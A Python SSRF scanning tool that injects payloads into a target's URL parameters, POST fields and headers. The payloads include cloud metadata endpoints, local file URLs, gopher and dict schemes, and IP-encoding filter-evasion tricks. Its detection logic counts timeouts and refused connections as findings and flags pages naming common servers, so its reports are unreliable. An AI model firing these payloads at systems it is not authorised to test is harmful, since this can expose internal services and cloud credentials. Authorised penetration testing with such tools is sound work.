#!/usr/bin/env python3
"""
Advanced SSRF Vulnerability Scanner
Author: Security Research Team
Description: Comprehensive tool for detecting Server-Side Request Forgery vulnerabilities
"""

import requests
import urllib.parse
import json
import threading
import time
import argparse
import sys
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Tuple, Any
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """Color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class SSRFScanner:
    def __init__(self, collaborator_url=None, proxy=None, timeout=10, threads=5):
        self.collaborator_url = collaborator_url
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.timeout = timeout
        self.threads = threads
        self.results = []
        self.lock = threading.Lock()
        
        # Basic SSRF Payloads
        self.basic_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "file:///proc/version",
            "file:///etc/hosts",
            "file://c:/windows/system32/drivers/etc/hosts",
        ]
        
        # Protocol fuzzing payloads
        self.protocol_payloads = [
            "ftp://127.0.0.1",
            "gopher://localhost",
            "dict://127.0.0.1:6379",
            "ldap://127.0.0.1",
            "sftp://127.0.0.1",
            "tftp://127.0.0.1",
        ]
        
        # Filter evasion payloads
        self.evasion_payloads = [
            "http://2130706433",  # Decimal IP for 127.0.0.1
            "http://0x7f000001",  # Hex IP for 127.0.0.1
            "http://0177.0.0.1",  # Octal IP
            "http://[::1]",  # IPv6 localhost
            "http://127.0.0.1@evil.com",  # Username trick
            "http://evil.com@127.0.0.1",  # Username trick reversed
            "http://127.000.000.1",  # Zero-padded IP
            "http://127.0.0.1.evil.com",  # Subdomain trick
            "http://127.0.0.1%00.evil.com",  # Null byte
            "http://127.0.0.1%2eevil.com",  # URL encoded dot
            "http://127.0.0.1:80",  # Explicit port
            "http://127.0.0.1:22",  # SSH port
            "http://127.0.0.1:3306",  # MySQL port
            "http://127.0.0.1:5432",  # PostgreSQL port
            "http://127.0.0.1:6379",  # Redis port
            "http://127.0.0.1:8080",  # Common web port
            "http://127.0.0.1:9200",  # Elasticsearch port
        ]
        
        # Headers to test for SSRF
        self.test_headers = [
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Forwarded-Host",
            "X-Original-URL",
            "X-Rewrite-URL",
            "Referer",
            "Host",
            "X-Forwarded-Proto",
            "X-Forwarded-Scheme",
            "X-Forwarded-Server",
            "X-Forwarded-Port",
            "X-HTTP-Host-Override",
            "Forwarded",
            "Client-IP",
            "True-Client-IP",
            "CF-Connecting-IP",
        ]
        
        if self.collaborator_url:
            self.basic_payloads.append(self.collaborator_url)
            self.protocol_payloads.append(f"http://{self.collaborator_url}")
            self.evasion_payloads.append(f"http://{self.collaborator_url}")

    def print_banner(self):
        """Print the scanner banner"""
        banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║                 Advanced SSRF Vulnerability Scanner         ║
║                      Security Research Tool                 ║
╚══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}[!] Use only on authorized targets - Educational purposes only{Colors.END}
"""
        print(banner)

    def log_result(self, test_type: str, url: str, payload: str, response_data: Dict):
        """Log test results"""
        with self.lock:
            result = {
                'test_type': test_type,
                'url': url,
                'payload': payload,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'response_data': response_data
            }
            self.results.append(result)

    def make_request(self, url: str, method: str = 'GET', headers: Dict = None, data: Any = None) -> Dict:
        """Make HTTP request with error handling"""
        try:
            session = requests.Session()
            if self.proxy:
                session.proxies.update(self.proxy)
            
            session.verify = False
            session.timeout = self.timeout
            
            if method.upper() == 'GET':
                response = session.get(url, headers=headers)
            elif method.upper() == 'POST':
                response = session.post(url, headers=headers, data=data, json=data if isinstance(data, dict) else None)
            else:
                response = session.request(method, url, headers=headers, data=data)
                
            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'content_length': len(response.content),
                'response_time': response.elapsed.total_seconds(),
                'text': response.text[:1000] if len(response.text) > 1000 else response.text,
                'error': None
            }
            
        except requests.exceptions.Timeout:
            return {'error': 'Timeout', 'status_code': None}
        except requests.exceptions.ConnectionError as e:
            return {'error': f'Connection Error: {str(e)}', 'status_code': None}
        except Exception as e:
            return {'error': f'Unexpected Error: {str(e)}', 'status_code': None}

    def discover_parameters(self, url: str, method: str = 'GET', data: Any = None) -> List[Tuple[str, str]]:
        """Discover parameters from URL and request body"""
        parameters = []
        
        # Parse URL parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            query_params = parse_qs(parsed_url.query, keep_blank_values=True)
            for param, values in query_params.items():
                for value in values:
                    parameters.append(('url_param', param))
        
        # Parse POST data parameters
        if method.upper() == 'POST' and data:
            if isinstance(data, str):
                try:
                    # Try to parse as JSON
                    json_data = json.loads(data)
                    if isinstance(json_data, dict):
                        for key in json_data.keys():
                            parameters.append(('json_param', key))
                except json.JSONDecodeError:
                    # Try to parse as form data
                    try:
                        form_params = parse_qs(data, keep_blank_values=True)
                        for param in form_params.keys():
                            parameters.append(('form_param', param))
                    except:
                        pass
            elif isinstance(data, dict):
                for key in data.keys():
                    parameters.append(('json_param', key))
        
        return parameters

    def inject_url_parameter(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query, keep_blank_values=True)
        
        if param in query_params:
            query_params[param] = [payload]
            new_query = urlencode(query_params, doseq=True)
            return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
        
        return url

    def inject_post_parameter(self, data: Any, param: str, payload: str, param_type: str) -> Any:
        """Inject payload into POST parameter"""
        if param_type == 'json_param' and isinstance(data, dict):
            new_data = data.copy()
            new_data[param] = payload
            return new_data
        elif param_type == 'json_param' and isinstance(data, str):
            try:
                json_data = json.loads(data)
                if isinstance(json_data, dict) and param in json_data:
                    json_data[param] = payload
                    return json.dumps(json_data)
            except:
                pass
        elif param_type == 'form_param' and isinstance(data, str):
            try:
                form_params = parse_qs(data, keep_blank_values=True)
                if param in form_params:
                    form_params[param] = [payload]
                    return urlencode(form_params, doseq=True)
            except:
                pass
        
        return data

    def test_parameter_injection(self, url: str, method: str = 'GET', data: Any = None):
        """Test SSRF injection in parameters"""
        print(f"\n{Colors.BLUE}[*] Testing parameter injection for: {url}{Colors.END}")
        
        parameters = self.discover_parameters(url, method, data)
        
        if not parameters:
            print(f"{Colors.YELLOW}[!] No parameters found for injection{Colors.END}")
            return
        
        print(f"{Colors.GREEN}[+] Found {len(parameters)} parameters to test{Colors.END}")
        
        # Test all payloads
        all_payloads = self.basic_payloads + self.protocol_payloads + self.evasion_payloads
        
        def test_payload_on_param(param_info, payload):
            param_type, param_name = param_info
            
            try:
                if param_type == 'url_param':
                    test_url = self.inject_url_parameter(url, param_name, payload)
                    response_data = self.make_request(test_url, method)
                    
                    if self.is_vulnerable(response_data, payload):
                        print(f"{Colors.RED}[!] POTENTIAL SSRF FOUND: {param_name} = {payload}{Colors.END}")
                        self.log_result('parameter_injection', test_url, payload, response_data)
                    else:
                        print(f"{Colors.CYAN}[*] Tested {param_name}: {payload[:50]}... | Status: {response_data.get('status_code', 'Error')}{Colors.END}")
                
                else:  # POST parameter
                    test_data = self.inject_post_parameter(data, param_name, payload, param_type)
                    response_data = self.make_request(url, method, data=test_data)
                    
                    if self.is_vulnerable(response_data, payload):
                        print(f"{Colors.RED}[!] POTENTIAL SSRF FOUND: {param_name} = {payload}{Colors.END}")
                        self.log_result('parameter_injection', url, payload, response_data)
                    else:
                        print(f"{Colors.CYAN}[*] Tested {param_name}: {payload[:50]}... | Status: {response_data.get('status_code', 'Error')}{Colors.END}")
                        
            except Exception as e:
                print(f"{Colors.RED}[!] Error testing {param_name} with {payload}: {str(e)}{Colors.END}")
        
        # Use ThreadPoolExecutor for parallel testing
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for param_info in parameters:
                for payload in all_payloads:
                    future = executor.submit(test_payload_on_param, param_info, payload)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Colors.RED}[!] Thread error: {str(e)}{Colors.END}")

    def test_header_injection(self, url: str, method: str = 'GET', data: Any = None):
        """Test SSRF injection in headers"""
        print(f"\n{Colors.BLUE}[*] Testing header injection for: {url}{Colors.END}")
        
        def test_header_payload(header, payload):
            try:
                headers = {header: payload}
                response_data = self.make_request(url, method, headers=headers, data=data)
                
                if self.is_vulnerable(response_data, payload):
                    print(f"{Colors.RED}[!] POTENTIAL SSRF FOUND in header {header}: {payload}{Colors.END}")
                    self.log_result('header_injection', url, f"{header}: {payload}", response_data)
                else:
                    print(f"{Colors.CYAN}[*] Tested header {header}: {payload[:50]}... | Status: {response_data.get('status_code', 'Error')}{Colors.END}")
                    
            except Exception as e:
                print(f"{Colors.RED}[!] Error testing header {header} with {payload}: {str(e)}{Colors.END}")
        
        # Test selected payloads in headers
        header_payloads = self.basic_payloads[:5] + self.evasion_payloads[:5]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for header in self.test_headers:
                for payload in header_payloads:
                    future = executor.submit(test_header_payload, header, payload)
                    futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Colors.RED}[!] Thread error: {str(e)}{Colors.END}")

    def is_vulnerable(self, response_data: Dict, payload: str) -> bool:
        """Analyze response to determine if SSRF vulnerability exists"""
        if response_data.get('error'):
            error_msg = response_data['error'].lower()
            
            # Connection errors might indicate SSRF
            if any(keyword in error_msg for keyword in ['connection refused', 'timeout', 'no route', 'unreachable']):
                return True
        
        # Check for successful responses that might indicate SSRF
        status_code = response_data.get('status_code')
        if status_code:
            # Successful responses to internal services
            if status_code in [200, 301, 302, 403, 404]:
                response_text = response_data.get('text', '').lower()
                
                # Check for AWS metadata
                if 'meta-data' in payload and any(keyword in response_text for keyword in ['ami-id', 'instance-id', 'security-groups']):
                    return True
                
                # Check for file access
                if payload.startswith('file://') and any(keyword in response_text for keyword in ['root:', 'bin:', 'etc:', 'windows']):
                    return True
                
                # Check for internal service responses
                if any(keyword in response_text for keyword in ['redis', 'mysql', 'postgresql', 'elasticsearch', 'apache', 'nginx']):
                    return True
        
        # Check response time (very slow responses might indicate SSRF)
        response_time = response_data.get('response_time', 0)
        if response_time > 10:  # More than 10 seconds
            return True
        
        return False

    def generate_report(self, output_file: str = None):
        """Generate detailed report of findings"""
        if not self.results:
            print(f"\n{Colors.YELLOW}[!] No vulnerabilities found{Colors.END}")
            return
        
        print(f"\n{Colors.GREEN}[+] Found {len(self.results)} potential SSRF vulnerabilities{Colors.END}")
        
        report = {
            'scan_summary': {
                'total_tests': len(self.results),
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'vulnerabilities_found': len(self.results)
            },
            'vulnerabilities': self.results
        }
        
        # Print summary
        print(f"\n{Colors.BOLD}=== SSRF VULNERABILITY REPORT ==={Colors.END}")
        for result in self.results:
            print(f"\n{Colors.RED}[VULNERABILITY FOUND]{Colors.END}")
            print(f"Type: {result['test_type']}")
            print(f"URL: {result['url']}")
            print(f"Payload: {result['payload']}")
            print(f"Time: {result['timestamp']}")
            
            response = result['response_data']
            if response.get('status_code'):
                print(f"Status Code: {response['status_code']}")
            if response.get('error'):
                print(f"Error: {response['error']}")
            print("-" * 60)
        
        # Save to file if specified
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    json.dump(report, f, indent=2)
                print(f"\n{Colors.GREEN}[+] Report saved to: {output_file}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error saving report: {str(e)}{Colors.END}")

    def scan(self, url: str, method: str = 'GET', data: Any = None):
        """Main scanning function"""
        print(f"\n{Colors.BOLD}Starting SSRF scan on: {url}{Colors.END}")
        print(f"Method: {method}")
        if data:
            print(f"Data: {str(data)[:100]}...")
        
        # Test parameter injection
        self.test_parameter_injection(url, method, data)
        
        # Test header injection
        self.test_header_injection(url, method, data)
        
        print(f"\n{Colors.BOLD}Scan completed!{Colors.END}")

def main():
    parser = argparse.ArgumentParser(description='Advanced SSRF Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method (default: GET)')
    parser.add_argument('-d', '--data', help='POST data (JSON or form-encoded)')
    parser.add_argument('-c', '--collaborator', help='Collaborator URL for out-of-band testing')
    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('-o', '--output', help='Output file for report (JSON format)')
    parser.add_argument('--custom-payloads', help='File containing custom payloads (one per line)')
    
    args = parser.parse_args()
    
    scanner = SSRFScanner(
        collaborator_url=args.collaborator,
        proxy=args.proxy,
        timeout=args.timeout,
        threads=args.threads
    )
    
    scanner.print_banner()
    
    # Load custom payloads if provided
    if args.custom_payloads:
        try:
            with open(args.custom_payloads, 'r') as f:
                custom_payloads = [line.strip() for line in f if line.strip()]
                scanner.basic_payloads.extend(custom_payloads)
                print(f"{Colors.GREEN}[+] Loaded {len(custom_payloads)} custom payloads{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading custom payloads: {str(e)}{Colors.END}")
    
    # Parse POST data if provided
    post_data = None
    if args.data:
        try:
            # Try to parse as JSON first
            post_data = json.loads(args.data)
        except json.JSONDecodeError:
            # Use as string (form data)
            post_data = args.data
    
    # Start scanning
    scanner.scan(args.url, args.method, post_data)
    
    # Generate report
    scanner.generate_report(args.output)

if __name__ == "__main__":
    main()